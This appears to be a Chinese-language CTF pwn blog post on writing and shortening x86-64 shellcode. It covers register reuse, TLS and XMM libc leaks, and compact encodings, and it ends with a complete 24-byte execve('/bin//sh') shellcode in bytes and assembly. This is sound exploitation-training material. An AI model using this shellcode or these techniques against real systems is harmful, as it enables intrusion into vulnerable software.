---
title: Shellcode
date: '2024-12-14 01:26:52'
updated: '2025-05-25 11:13:14'
---
## pwntools 生成shellcode
`shellcraft.sh()`生成getshell用的汇编代码

`asm()`把括号里面的内容转成机器码

## /bin/sh 指针获取
可以利用 add 让 `jmp` 的寄存器指向 payload 的`/bin/sh`

也可以 push /bin/sh 然后用 rsp 指针

## 缩短 shellcode 
来自Xp0int 飞书的《Pwn Survival Guide》

Author：@xf1les 

Date：2023/03/31

最近看了 NKCTF 2023 的 9961code 这道题。像这种限制 shellcode 长度的题目以后会经常遇到，这里写一下个人的有关缩短 shellcode 长度的一些技巧。

### 重用残留的寄存器值
可利用的寄存器值有以下三种：

+ **libc 地址**
+ shellcode 地址
+ 特殊值（例如 `0`）

其中最有价值的是 libc 地址。**只要拿到 libc 地址，就能转跳到 one gadget 直接 get shell**。

```plain
0:    48 8d 88 cc ed ff ff     lea    rcx,  [rax-0x1234] ; 假设 rax 是一个 libc 地址
7:    ff e1                    jmp    rcx                ; 转跳至 one gadget
```

可以通过以下3个途径获得残留的寄存器值

+ 通用寄存器（如：`rdi`/`rsi`/`rax` 等）
+ **段寄存器**（`fs`/`gs`）
+ **XMM寄存器**（`xmm0`-`xmm7`）

这里重点一下后面两种途径。

**两个段寄存器（64位**`**fs**`**/32位**`**gs**`**）**指向的是 **TLS** (Thread Local Storage) 内存。在用户态下，TLS 简单来说就是glibc 分配的一块特殊内存，存储了一些与当前线程相关的信息，上面**可以泄露 libc 地址、canary 等大量有用信息**。

在 gdb 下，可以使用 pwndbg 提供的`tls`命令获取 TLS 的内存地址。

![](/images/1ef962ad19b39f756782afeffd0584d7.png)

访问 fs 指向的 TLS 内存

```plain
0:    64 48 8b 04 25 c8 ff ff ff  mov    rax,  [fs:-0x38] ; 立即寻址
 9:    48 c7 c7 c8 ff ff ff        mov    rdi,  -0x38
10:    64 48 8b 07                 mov    rax,  [fs:rdi] ; 通过寄存器间接寻址
```

TLS 内存的内容因 glibc 版本而异，常见的内容有：

```plain
[fs:0x00]  tls 内存的地址
[fs:0x28]  canary
[fs:0x30]  pointer guard cookie
[fs:-0x38] main_arena 地址（<--- 即 libc 地址）
[fs:-0x48] tcache 地址（<--- 即堆地址）
```

**XMM寄存器**是8个长度为128位的寄存器`xmm0`-`xmm7`，常用于大规模的数据处理（例如科学计算、视频解码）。跟通用寄存器一样，有时会残留内存地址（例如 libc 地址）。

在 gdb 下，使用`print`指令查看某个XMM寄存器的值。

![](/images/0437d88bb9728bb9e4cb09bcc23972b6.png)

一个xmm寄存器可以视为两个64位寄存器。xmm寄存器和通用寄存器之间的数据移动操作如下：

```plain
0:    66 48 0f 7e e8           movq   rax,  xmm5   ; 将 xmm5 低64位数据移动至 rax
5:    0f 17 2c 24              movhps [rsp],  xmm5 ; 将 xmm5 高64位数据移动至 rdx
9:    5a                       pop    rdx          ; 注意：movhps 的目的地必须是内存
                                                   ;      这里使用栈作为中转内存
```

### 使用长度更短的指令
#### 获得零值
```plain
0:    ba 00 00 00 00           mov    edx,  0x0 ; 使用 mov 清零，不但浪费 shellcode 空间
                                                ; 空字节还可能会截断 shellcode

; 以下是长度更短的等效指令
5:    99                       cdq              ; 一字节清零 rdx 寄存器
                                                ; 仅当 rax 寄存器最高比特位为1不可用
                                                ; cdq是将rdx的全部位(bit)改为rax的最高位
6:    48 31 d2                 xor    rdx,  rdx ; 三字节清零任意寄存器
```

#### 加载小常数到寄存器
```plain
0:    b8 3b 00 00 00           mov    eax,  0x3b ; 问题见上一节

; 以下是长度更短的等效指令
5:    6a 3b                    push   0x3b 			 ; 利用栈做中转，只需三字节
9:    58                       pop    rax        ;  不但长度更短，还能减少不必要的空字节
5:    b0 3b                    mov    al,  0x3b  ; 若64位寄存器高位恰好是零，
                                                 ; 可以换用8位寄存器，节省更多字节
```

#### 将寄存器的值移动至另一个寄存器
```plain
0:    48 89 c7                 mov    rdi,  rax ; 使用 mov 需要三字节
   
; 以下是长度更短的等效指令
   6:    50                       push   rax       ; 利用栈做中转只需两字节
   7:    5a                       pop    rdx
   3:    48 97                    xchg   rdi,  rax ; 交换两个寄存器的数值
                                                   ; 当其中一个寄存器是 rax 时，只需两字节
   5:    97                       xchg   edi,  eax ; 若使用32位寄存器，只需一字节！
```

### 杂项
[shellcode链接](https://www.zorinaq.com/papers/shellcode-amd64.html) 最短的 amd64 通用 shellcode，只需24字节

解释：

```plain
6a 3b	push $0x3b	
58	pop %rax	                               ;set %rax to 0x3b
99	cltd	                                   ;%rdx (arg 3: envp) is set to 0
48 bb 2f 62 69 6e 2f 2f 73 68	mov $0x68732f2f6e69622f,%rbx	;set %rbx to "/bin//sh"
52	push %rdx	                               ;push 0
53	push %rbx	                               ;push "/bin//sh"
54	push %rsp	
5f	pop %rdi	                               ;%rdi (arg 1: path) points to "/bin//sh"
52	push %rdx	                               ;push 0
57	push %rdi	                               ;push ptr to path
54	push %rsp	
5e	pop %rsi	                               ;%rsi (arg 2: argv) points to ["/bin//sh",0]
0f 05	syscall	                               ;execve(path,argv,envp)
```

汇编：

```plain
push $0x3b
pop %rax
cltd
mov $0x68732f2f6e69622f,%rbx
push %rdx
push %rbx
push %rsp
pop %rdi
push %rdx
push %rdi
push %rsp
pop %rsi
syscall
```

